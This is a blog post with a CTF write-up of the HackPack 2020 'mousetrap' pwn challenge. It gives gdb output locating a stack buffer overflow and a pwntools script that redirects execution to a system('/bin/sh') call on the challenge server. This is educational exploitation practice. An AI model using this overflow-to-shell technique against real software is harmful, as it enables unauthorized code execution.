<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>HackPack CTF: Pwn Challenge | gr4n173</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="HackPack CTF: Pwn Challenge" />
<meta name="author" content="gr4n173>" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="I will explain about the pwn challenges that I solved in during CTF." />
<meta property="og:description" content="I will explain about the pwn challenges that I solved in during CTF." />
<link rel="canonical" href="http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html" />
<meta property="og:url" content="http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html" />
<meta property="og:site_name" content="gr4n173" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-05-01T00:00:00+05:45" />
<script type="application/ld+json">
{"@type":"BlogPosting","url":"http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html","headline":"HackPack CTF: Pwn Challenge","dateModified":"2020-05-01T00:00:00+05:45","datePublished":"2020-05-01T00:00:00+05:45","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html"},"author":{"@type":"Person","name":"gr4n173>"},"description":"I will explain about the pwn challenges that I solved in during CTF.","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/public/images/blackflag.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="gr4n173" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">gr4n173<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/"><i class="fab fa-twitter"></i></a><a class="color-red-hover" href="https://gr4n173.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/gr4n173"><i class="fab fa-github"></i></a><a class="color-blue-hover" href="https://www.facebook.com/profile.php?id=100038644863435"><i class="fab fa-facebook"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/680705408297730058"><i class="fab fa-discord"></i></a><a class="color-red-hover" href="mailto:me.gr4n173@protonmail.com"><i class="fab fa-mailchimp"></i></a><a class="color-cyan-hover" href="https://www.hackthebox.eu/home/users/profile/60443"><i class="fab fa-itch-io"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">

<img src="https://gravatar.com/avatar/6691d16a4bf77dcf1f54ee766349682a?s=256" class="author-avatar" />

Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.

</div>

<div class="post">
  <h1 class="post-title">HackPack CTF: Pwn Challenge</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/ctf/">ctf</a>
      
      <a class="tag" href="/tag/hackpackctf/">hackpackctf</a>
      
      <a class="tag" href="/tag/pwn/">pwn</a>
      
      <a class="tag" href="/tag/BoF/">BoF</a>
      
      <a class="tag" href="/tag/Explotation&Pwning/">Explotation&Pwning</a>
      
  </div>
  
  <div class="post-date">Published on 01 May 2020</div>
  
  <div class="post-description"> I will explain about the pwn challenges that I solved in during CTF.</div>
  
  <h1 id="hackpack-ctf">HackPack CTF</h1>

<p>HackPack CTF is a security competition that is part of the two security courses at NCSU: CSC-405 Computer Security and CSC-591 Systems Attacks and Defenses. The target audience is people interested in computer security that have some related background (like took a security course before ;) and want to exercise their skills in a secure environment by solving security challenges.
For more detail you can visit <a href="https://hackpack.club/ctf2020">here</a>.</p>

<p>I will talk about the challenges that I solved during live of ctf.</p>

<h2 id="pwn-challenges">Pwn Challenges</h2>

<h3 id="mousetrap">mousetrap</h3>
<h4 id="description232">Description[232]</h4>
<p>Are you savvy enough to steal a piece of cheese?</p>

<p><code class="highlighter-rouge">nc cha.hackpack.club 41719</code></p>

<h4 id="file-mousetrap">File: <a href="/public/files/ctf/mousetrap">mousetrap</a></h4>

<p><strong>Solution:-</strong> As I run the challenge I was asked to enter the name randomly and then code Sequence but got the output with <code class="highlighter-rouge">SNAAAAAAAP! you died!%</code>. Now I grabbed my gdb and analyze the ELF file.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
gr4n173@root:~# gdb -q mousetrap
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 9.1 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from mousetrap...
(No debugging symbols found in mousetrap)
gef➤  info functions
All defined functions:
Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  strcpy@plt
0x00000000004005e0  puts@plt
0x00000000004005f0  system@plt
0x0000000000400600  printf@plt
0x0000000000400610  read@plt
0x0000000000400620  setvbuf@plt
0x0000000000400630  _start
0x0000000000400660  _dl_relocate_static_pie
0x0000000000400670  deregister_tm_clones
0x00000000004006a0  register_tm_clones
0x00000000004006e0  __do_global_dtors_aux
0x0000000000400710  frame_dummy
0x0000000000400717  cheeeeeeeese
0x000000000040072a  init
0x000000000040078b  set_mouse_name
0x00000000004007c1  grab_cheese
0x00000000004007e3  deactivate_trap
0x0000000000400823  menu
0x0000000000400842  main
0x00000000004008c0  __libc_csu_init
0x0000000000400930  __libc_csu_fini
0x0000000000400934  _fini
gef➤
</code></pre></div></div>
<p>Then I break a point in <code class="highlighter-rouge">set_mouse_name</code> function and the I run it.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
gef➤  break set_mouse_name
Breakpoint 1 at 0x40078f
gef➤  run
Starting program: /home/bikram/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
Welcome little mouse
can you steal the cheese from the mouse trap

Breakpoint 1, 0x000000000040078f in set_mouse_name ()
[ Legend: Modified register | Code | Heap | Stack | String ]
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdc90  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15
$rbx   : 0x0               
$rcx   : 0x00007ffff7ece643  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15
$rbp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15
$rsi   : 0x00007ffff7f9d723  →  0xf9f4c0000000000a
$rdi   : 0x00007fffffffdc90  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15
$rip   : 0x000000000040078f  →  &lt;set_mouse_name+4&gt; sub rsp, 0x10
$r8    : 0x2d              
$r9    : 0x00007ffff7fe3530  →  &lt;_dl_fini+0&gt; push rbp
$r10   : 0x00007ffff7fef7c0  →  &lt;strcmp+2544&gt; pxor xmm0, xmm0
$r11   : 0x246             
$r12   : 0x0000000000400630  →  &lt;_start+0&gt; xor ebp, ebp
$r13   : 0x00007fffffffdd90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb70│+0x0000: 0x00007fffffffdcb0  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15	 ← $rsp, $rbp
0x00007fffffffdb78│+0x0008: 0x000000000040087d  →  &lt;main+59&gt; mov rdx, QWORD PTR [rbp-0x8]
0x00007fffffffdb80│+0x0010: 0x00007fffffffdd98  →  0x00007fffffffe120  →  "/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]"
0x00007fffffffdb88│+0x0018: 0x00000001ffffdcd0
0x00007fffffffdb90│+0x0020: 0x0000000000000000
0x00007fffffffdb98│+0x0028: 0x0000000000000000
0x00007fffffffdba0│+0x0030: 0x0000000000000000
0x00007fffffffdba8│+0x0038: 0x00007ffff7ffe730  →  0x00007ffff7fd2000  →  0x00010102464c457f
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400786 &lt;init+92&gt;        (bad)  
     0x400787 &lt;init+93&gt;        call   QWORD PTR [rax+0x4855c35d]
     0x40078d &lt;set_mouse_name+2&gt; mov    ebp, esp
 →   0x40078f &lt;set_mouse_name+4&gt; sub    rsp, 0x10
     0x400793 &lt;set_mouse_name+8&gt; mov    QWORD PTR [rbp-0x8], rdi
     0x400797 &lt;set_mouse_name+12&gt; lea    rdi, [rip+0x1b2]        # 0x400950
     0x40079e &lt;set_mouse_name+19&gt; mov    eax, 0x0
     0x4007a3 &lt;set_mouse_name+24&gt; call   0x400600 &lt;printf@plt&gt;
     0x4007a8 &lt;set_mouse_name+29&gt; mov    rax, QWORD PTR [rbp-0x8]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mousetrap", stopped 0x40078f in set_mouse_name (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40078f → set_mouse_name()
[#1] 0x40087d → main()
</code></pre></div></div>
<p>Then I run <code class="highlighter-rouge">ni</code> till I reached to <code class="highlighter-rouge">read</code> where my value was stored.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
gef➤  ni
0x00000000004007b9 in set_mouse_name ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdc90  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x20              
$rsp   : 0x00007fffffffdb60  →  0x0000000000000000
$rbp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15
$rsi   : 0x00007fffffffdc90  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15
$rdi   : 0x0               
$rip   : 0x00000000004007b9  →  &lt;set_mouse_name+46&gt; call 0x400610 &lt;read@plt&gt;
$r8    : 0x2d              
$r9    : 0x6               
$r10   : 0x0000000000400950  →  0x4500203a656d614e ("Name: "?)
$r11   : 0x246             
$r12   : 0x0000000000400630  →  &lt;_start+0&gt; xor ebp, ebp
$r13   : 0x00007fffffffdd90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb60│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffdb68│+0x0008: 0x00007fffffffdc90  →  0x00000000004008c0  →  `__libc_csu_init+0` push r15
0x00007fffffffdb70│+0x0010: 0x00007fffffffdcb0  →  0x00000000004008c0  →  &lt;__libc_csu_init+0&gt; push r15	 ← $rbp
0x00007fffffffdb78│+0x0018: 0x000000000040087d  →  &lt;main+59&gt; mov rdx, QWORD PTR [rbp-0x8]
0x00007fffffffdb80│+0x0020: 0x00007fffffffdd98  →  0x00007fffffffe120  →  "/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]"
0x00007fffffffdb88│+0x0028: 0x00000001ffffdcd0
0x00007fffffffdb90│+0x0030: 0x0000000000000000
0x00007fffffffdb98│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007ac &lt;set_mouse_name+33&gt; mov    edx, 0x20
     0x4007b1 &lt;set_mouse_name+38&gt; mov    rsi, rax
     0x4007b4 &lt;set_mouse_name+41&gt; mov    edi, 0x0
 →   0x4007b9 &lt;set_mouse_name+46&gt; call   0x400610 &lt;read@plt&gt;
   ↳    0x400610 &lt;read@plt+0&gt;     jmp    QWORD PTR [rip+0x200a22]        # 0x601038 &lt;read@got.plt&gt;
        0x400616 &lt;read@plt+6&gt;     push   0x4
        0x40061b &lt;read@plt+11&gt;    jmp    0x4005c0
        0x400620 &lt;setvbuf@plt+0&gt;  jmp    QWORD PTR [rip+0x200a1a]        # 0x601040 &lt;setvbuf@got.plt&gt;
        0x400626 &lt;setvbuf@plt+6&gt;  push   0x5
        0x40062b &lt;setvbuf@plt+11&gt; jmp    0x4005c0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
read@plt (
   $rdi = 0x0000000000000000,
   $rsi = 0x00007fffffffdc90 → 0x00000000004008c0 → `libc_csu_init+0` push r15,
   $rdx = 0x0000000000000020
)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mousetrap", stopped 0x4007b9 in `set_mouse_name` (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007b9 → `set_mouse_name()`
[#1] 0x40087d → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
</code></pre></div></div>

<p>There you can see <code class="highlighter-rouge">$rdx</code>=<code class="highlighter-rouge">0x0000000000000020</code> which is hex value and it allocates 32 bytes of data from input. But given file was 64bit(<code class="highlighter-rouge">8*8=64</code>) so 8 bytes was allocated for <code class="highlighter-rouge">rbp</code>. So the actually bytes that was allocated by <code class="highlighter-rouge">name</code> variable was 24(32-8)bytes.
As soon as I got I can check that in gdb.</p>

<p><strong>32 bytes data:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern create 32
[+] Generating a pattern of 32 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaa
[+] Saved as '$_gef0'
gef➤  run
Starting program: /home/bikram/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
Welcome little mouse
can you steal the cheese from the mouse trap
Name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaa
Enter Code Sequence of 7016996765293437284: SNAAAAAAAP! you died![Inferior 1 (process 11792) exited normally]
gef➤ 
</code></pre></div></div>
<p><strong>24 bytes data:</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern create 24
[+] Generating a pattern of 24 bytes
aaaaaaaabaaaaaaacaaaaaaa
[+] Saved as '$_gef0'
gef➤  run
Starting program: /home/bikram/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
Welcome little mouse
can you steal the cheese from the mouse trap
Name: aaaaaaaabaaaaaaacaaaaaaa
Enter Code Sequence of 10: 

</code></pre></div></div>

<p>From here I was asked for code sequence. Then offset of code sequence was found as follow:-</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as `'$_gef0'`  
gef➤  run
Starting program: /home/bikram/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap
Welcome little mouse
can you steal the cheese from the mouse trap
Name: aaaaaaaabaaaaaaacaaaaaaa@
Enter Code Sequence of 2624: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007e2 in `grab_cheese` ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdb60  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x0               
$rcx   : 0x60              
$rdx   : 0x15              
$rsp   : 0x00007fffffffdb78  →  "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"
$rbp   : 0x6161616161616163 ("caaaaaaa"?)
$rsi   : 0x00007fffffffdbe0  →  "kaaaaaaalaaaaaaamaaa\n"
$rdi   : 0x00007fffffffdbb0  →  "kaaaaaaalaaaaaaamaaa\n"
$rip   : 0x00000000004007e2  →  &lt;grab_cheese+33&gt; ret 
$r8    : 0x0               
$r9    : 0x1d              
$r10   : 0x00007ffff7feff40  →  `&lt;strcmp+4464&gt;` pxor xmm0, xmm0
$r11   : 0x00007ffff7f3fc00  →  `&lt;__strcpy_avx2+0&gt;` mov rcx, rsi
$r12   : 0x0000000000400630  →  &lt;_start+0&gt; xor ebp, ebp
$r13   : 0x00007fffffffdd90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb78│+0x0000: "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"	 ← $rsp
0x00007fffffffdb80│+0x0008: "eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"
0x00007fffffffdb88│+0x0010: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
0x00007fffffffdb90│+0x0018: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x00007fffffffdb98│+0x0020: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n"
0x00007fffffffdba0│+0x0028: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n"
0x00007fffffffdba8│+0x0030: "jaaaaaaakaaaaaaalaaaaaaamaaa\n"
0x00007fffffffdbb0│+0x0038: "kaaaaaaalaaaaaaamaaa\n"	 ← $rdi
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4007db &lt;grab_cheese+26&gt; call   0x4005d0 &lt;strcpy@plt&gt;
     0x4007e0 &lt;grab_cheese+31&gt; nop    
     0x4007e1 &lt;grab_cheese+32&gt; leave  
 →   0x4007e2 &lt;grab_cheese+33&gt; ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "mousetrap", stopped 0x4007e2 in `grab_cheese ()`, reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4007e2 → `grab_cheese()`
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
</code></pre></div></div>
<p>Now there you can see the address of <code class="highlighter-rouge">$rsp</code> is replaced by variable so I took that variable and found the offset.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  pattern offset daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja
[+] Searching 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja'
[+] Found at offset 24 (big-endian search) 
gef➤
</code></pre></div></div>

<p>So a <code class="highlighter-rouge">Code Sequence</code> accepted 24 bytes of data after that value it was overflow and gave me <code class="highlighter-rouge">SIGSEGV</code> error you can see in the above output.</p>

<p>Now my offsets combination will be</p>

<blockquote>
  <p>Name =&gt; 24 + 1( to overflow) bytes</p>

  <p>Code Sequence =&gt; 24 + (address of shell) bytes</p>
</blockquote>

<p>Then my final task was to find the address of shell(/bin/bash or /bin/sh) inside the file. For that I again searched for the functions which seems interesting and then I found <code class="highlighter-rouge">cheeeeeeeese</code> functions and disassemble that function.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  info functions
All defined functions:
Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  strcpy@plt
0x00000000004005e0  puts@plt
0x00000000004005f0  system@plt
0x0000000000400600  printf@plt
0x0000000000400610  read@plt
0x0000000000400620  setvbuf@plt
0x0000000000400630  _start
0x0000000000400660  `_dl_relocate_static_pie`
0x0000000000400670  `deregister_tm_clones`
0x00000000004006a0  `register_tm_clones`
0x00000000004006e0  `__do_global_dtors_aux`
0x0000000000400710  `frame_dummy`
0x0000000000400717  cheeeeeeeese
0x000000000040072a  init
0x000000000040078b  `set_mouse_name`
0x00000000004007c1  `grab_cheese`
0x00000000004007e3  `deactivate_trap`
0x0000000000400823  menu
0x0000000000400842  main
0x00000000004008c0  `__libc_csu_init`
0x0000000000400930  `__libc_csu_fini`
0x0000000000400934  `_fini`
gef➤  disass 0x0000000000400717
Dump of assembler code for function cheeeeeeeese:
   0x0000000000400717 &lt;+0&gt;:	push   rbp
   0x0000000000400718 &lt;+1&gt;:	mov    rbp,rsp
   0x000000000040071b &lt;+4&gt;:	lea    rdi,[rip+0x226]        # 0x400948
   0x0000000000400722 &lt;+11&gt;:	call   0x4005f0 &lt;system@plt&gt;
   0x0000000000400727 &lt;+16&gt;:	nop
   0x0000000000400728 &lt;+17&gt;:	pop    rbp
   0x0000000000400729 &lt;+18&gt;:	ret    
End of assembler dump
</code></pre></div></div>

<p>Then there you can find the <code class="highlighter-rouge">system address</code> before that there should be <code class="highlighter-rouge">/bin/sh</code> shell so checking the string at address <code class="highlighter-rouge">0x400948</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  disass cheeeeeeeese
Dump of assembler code for function cheeeeeeeese:
   0x0000000000400717 &lt;+0&gt;:	push   rbp
   0x0000000000400718 &lt;+1&gt;:	mov    rbp,rsp
   0x000000000040071b &lt;+4&gt;:	lea    rdi,[rip+0x226]        # 0x400948
   0x0000000000400722 &lt;+11&gt;:	call   0x4005f0 &lt;system@plt&gt;
   0x0000000000400727 &lt;+16&gt;:	nop
   0x0000000000400728 &lt;+17&gt;:	pop    rbp
   0x0000000000400729 &lt;+18&gt;:	ret    
End of assembler dump.
gef➤  x/s 0x400948
0x400948:	"/bin/sh"
gef➤  
</code></pre></div></div>

<p>So In order to execute the shell I had to call the address before the address of <code class="highlighter-rouge">/bin/sh</code> so that after overflow that address will be executed and we got the shell i.e. <code class="highlighter-rouge">0x000000000040071b</code>.</p>

<p>So my final payload was:-</p>

<blockquote>
  <p>Name =&gt; 24 + 1( to overflow) bytes</p>

  <p>Code Sequence =&gt; 24 + (address before /bin/sh) bytes</p>
</blockquote>

<p>In order to execute this on server of <code class="highlighter-rouge">hackpack</code>and get a flag I made script in python.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import * 
from sys import * 

context= ['tmux', 'new-window']
p=remote('cha.hackpack.club',41719)
elf=ELF("./mousetrap")
p=gdb.debug("./mousetrap")
p.recvuntil("Name: ")

# to overflow the Code sequence 
payload= "A"*24 
payload+= p64(0x40) #value to overflow the name variable
p.send(payload)

p.recvuntil("Enter Code Sequence of 64: ")

payload2= "A"*24
payload2+= p64(0x000000000040071b)#  address before /bin/sh
p.send(payload2)

p.interactive()
</code></pre></div></div>

<p>By running this I got the flag .</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gr4n173@root:~# python exploit.py
+] Starting local process './mousetrap': pid 14085
[*] '/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/gr4n173/mystuff/onlinectf/hackpack/pwn/mousetrapfile/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/usr/bin/gdbserver': pid 14089
[*] running in new terminal: /usr/bin/gdb -q  "./mousetrap" -x "/tmp/pwnQRen2_.gdb"
[*] Switching to interactive mode
Detaching from process 14105
$ ls
flag.txt
mousetrap
$ cat flag.txt
flag{C0nTr0l_S1Z3_4_$h3LL}
</code></pre></div></div>

<h2 id="conclusion-">Conclusion:-</h2>

<p>This challenge include a simple Buffer overflow(BoF) task and had to call a function <code class="highlighter-rouge">cheeeeeeeese</code> where <code class="highlighter-rouge">/bin/sh</code> was located instead of providing our global offset of <code class="highlighter-rouge">/bin/sh</code>.</p>

<p>Stay updated to my blog, I will be posting next writeup soon. I started writing a series of <code class="highlighter-rouge">Exploitation &amp; Pwning</code> posts as this is my first post of this series here I explained about BoF. At last but not least I like to thank my friend <code class="highlighter-rouge">Linuz</code> for helping me out.</p>

<p>I would like to thank all my reader. Feedback Really appreciated in comment below.</p>

<p>Stay Safe</p>

<p>Keep Learning</p>


</div>


<div class="comments">
<div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'gr4n173'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


</div>




<div class="related">
  <h2>related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/2020/04/18/htb-mango.html">
          Hack The Box: Mango
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/04/17/virseccon-ctf-web.html">
           VirSecCon CTF: Web Challenges
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/2020/04/13/virseccon-ctf-scripting.html">
           VirSecCon CTF: Scripting Challenges
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>all tags</h2>
  <div class="tag-cloud"><a href="/tag/.chm/" class="set-1">.chm</a> <a href="/tag/bof/" class="set-1">BoF</a> <a href="/tag/explotation%26pwning/" class="set-1">Explotation&Pwning</a> <a href="/tag/invoke/" class="set-1">Invoke</a> <a href="/tag/nosql/" class="set-1">Nosql</a> <a href="/tag/phpjuggler/" class="set-1">PhpJuggler</a> <a href="/tag/powershell/" class="set-1">Powershell</a> <a href="/tag/re/" class="set-1">RE</a> <a href="/tag/smb/" class="set-1">SMB</a> <a href="/tag/ssti/" class="set-1">SSTI</a> <a href="/tag/vscctf/" class="set-2">VSCCTF</a> <a href="/tag/virseccon/" class="set-2">VirSecCon</a> <a href="/tag/binaryexploitation/" class="set-1">binaryexploitation</a> <a href="/tag/boltcms/" class="set-1">boltcms</a> <a href="/tag/csrftorce/" class="set-1">csrftorce</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/ffuf/" class="set-1">ffuf</a> <a href="/tag/ftp/" class="set-2">ftp</a> <a href="/tag/fuzz/" class="set-1">fuzz</a> <a href="/tag/gdb/" class="set-1">gdb</a> <a href="/tag/hackpackctf/" class="set-1">hackpackctf</a> <a href="/tag/htb/" class="set-5">htb</a> <a href="/tag/ipv6/" class="set-1">ipv6</a> <a href="/tag/jjs/" class="set-1">jjs</a> <a href="/tag/linux/" class="set-4">linux</a> <a href="/tag/linxu/" class="set-1">linxu</a> <a href="/tag/lkm/" class="set-1">lkm</a> <a href="/tag/mongodb/" class="set-1">mongodb</a> <a href="/tag/nc.exe/" class="set-1">nc.exe</a> <a href="/tag/nephack3/" class="set-1">nephack3</a> <a href="/tag/nishang/" class="set-1">nishang</a> <a href="/tag/oauth2/" class="set-1">oauth2</a> <a href="/tag/pcap/" class="set-1">pcap</a> <a href="/tag/port-forward/" class="set-1">port-forward</a> <a href="/tag/postgres/" class="set-1">postgres</a> <a href="/tag/pwn/" class="set-2">pwn</a> <a href="/tag/pwnables/" class="set-1">pwnables</a> <a href="/tag/python/" class="set-1">python</a> <a href="/tag/rce/" class="set-1">rce</a> <a href="/tag/restic-server/" class="set-1">restic-server</a> <a href="/tag/rsync/" class="set-1">rsync</a> <a href="/tag/scripting/" class="set-1">scripting</a> <a href="/tag/selenium/" class="set-1">selenium</a> <a href="/tag/server/" class="set-1">server</a> <a href="/tag/sqli/" class="set-2">sqli</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/virseccon/" class="set-2">virseccon</a> <a href="/tag/webchallenge/" class="set-1">webchallenge</a> <a href="/tag/webshell/" class="set-1">webshell</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/whoami/" class="set-1">whoami</a> <a href="/tag/whois/" class="set-1">whois</a> <a href="/tag/windows/" class="set-1">windows</a></div>
  




      </div>
    </main><footer class="site-footer">
  <div class="wrapper">
	  <center><script src="https://www.hackthebox.eu/badge/60443"></script> </center><div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
